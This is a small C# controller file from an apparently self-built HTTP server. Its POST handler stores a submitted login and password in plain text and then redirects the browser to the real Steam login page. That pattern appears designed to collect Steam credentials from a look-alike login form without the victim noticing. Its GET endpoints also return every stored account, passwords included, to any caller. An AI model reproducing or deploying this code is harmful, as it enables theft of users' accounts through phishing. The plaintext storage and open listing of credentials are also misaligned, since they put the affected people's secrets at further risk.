using HttpServer2.Attributes;
using HttpServer2.Models;
using HttpServer2.ServerResponse;
using System.Collections.Generic;
using System.Linq;
using System.Net;

namespace HttpServer2.Controllers
{
    [ApiController]
    public class Accounts
    {
        MyORM orm = new MyORM();

        [HttpGET("/")]
        public IEnumerable<Account> GetAccounts()
        {
            return orm.Select<Account>();
        }

        [HttpGET("/{id}")]
        public Account? GetAccountById(int id)
        {
            return orm
                .Select<Account>()
                .Where(x => x.Id == id)
                .FirstOrDefault();
        }

        [HttpPOST("/")]
        public IControllerResult PostAccounts(string login, string password)
        {
            orm
                .Insert(new Account { Login = login, Password = password });

            return new Redirect("https://store.steampowered.com/login/?redir=&redir_ssl=1&snr=1_4_4__global-header");
        }
    }
}
